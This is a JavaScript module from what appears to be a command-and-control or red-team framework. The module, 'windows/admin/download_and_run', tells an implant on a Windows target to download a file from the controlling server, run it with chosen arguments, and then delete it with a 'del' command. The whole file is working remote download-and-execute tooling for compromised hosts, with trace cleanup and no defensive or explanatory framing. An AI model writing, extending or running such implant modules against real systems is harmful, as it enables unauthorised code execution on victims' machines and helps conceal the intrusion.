const moduleHelper = require("../../../src/moduleHelper");

// This function returns the module object to be loaded in the database 
exports.load = function (app) {
    var module = {
        name: "windows/admin/download_and_run",
        options: {
            file: {
                value: "",
                required: true,
                description: "The ID of the file to download"
            },
            path: {
                value: "C:\\Temp",
                required: true,
                description: "The path to download the file to"
            },
            arguments:{
                value: "",
                required: false,
                description: "The arguments to execute the program with"
            },
            implant:{
                value: "",
                required: true,
                description: "The ID of the implant"
            }
        },
        supportedOS: ["windows"],

        description: "Downloads and runs a file on the target implant",

        requiredPayloads: ["Command", "Download"]
    }
    return module;
};

// This is the first function to be called when the module is ran
exports.run = async function (app, run) {
    var file = await app.service("/fs/files").get(run.options.file.value).catch(() => {});
    if (!file){
        moduleHelper.logError(run, "File not found");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }

    // Creating the job and setting the callback
    var job = await moduleHelper.createJob(app,run,"afterDownload" ,{type:"Download", options:{ file: file.filename, file_id: file._id, length: file.length, chunkSize: file.chunkSize, path: run.options.path.value}}).catch(() => {});
    if(!job){
        moduleHelper.logError(run, "Error Creating Download Job");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    moduleHelper.logInfo(run, "Requested the download of: " + file.filename);
    moduleHelper.inProgress(run);
    moduleHelper.patch(app,run);
};

// There are callback than can be executed once jobs are completed
exports.afterDownload = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(run, "Error during download: " + job.result);
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    // We can add variables to the run
    run.filepath = job.result;

    var job2 = await moduleHelper.createJob(app,run,"afterExecute" ,{type:"Command", options:{cmd: job.result + " " + run.options.arguments.value}}).catch(() => {});
    if(!job2){
        moduleHelper.logError(run, "Error Creating Command Job");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    moduleHelper.logSuccess(run, "Download succeeded, executing: " + job.result + " " + run.options.arguments.value);
    moduleHelper.patch(app,run);
};

// There are callback than can be executed once jobs are completed
exports.afterExecute = async function (app, run, job) {

    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(run, "Error during Execute, trying to delete:\r\n" + job.result);
    }else{
        moduleHelper.logSuccess(run, "Successfully executed command: \r\n" + job.result);
    }
    var job2 = await moduleHelper.createJob(app,run,"afterDelete" ,{type:"Command", options:{cmd: "del " + run.filepath}}).catch(() => {});
    if(!job2){
        moduleHelper.logError(run, "Error Creating Delete Job, file must be deleted manually");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    moduleHelper.patch(app,run);
};

// There are callback than can be executed once jobs are completed
exports.afterDelete = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(run, "Error during delete, file must be deleted manually");
        moduleHelper.fail(run);
    }else{
        moduleHelper.logSuccess(run, "Successfully deleted file");
        moduleHelper.success(run);
    }
    moduleHelper.patch(app,run);
};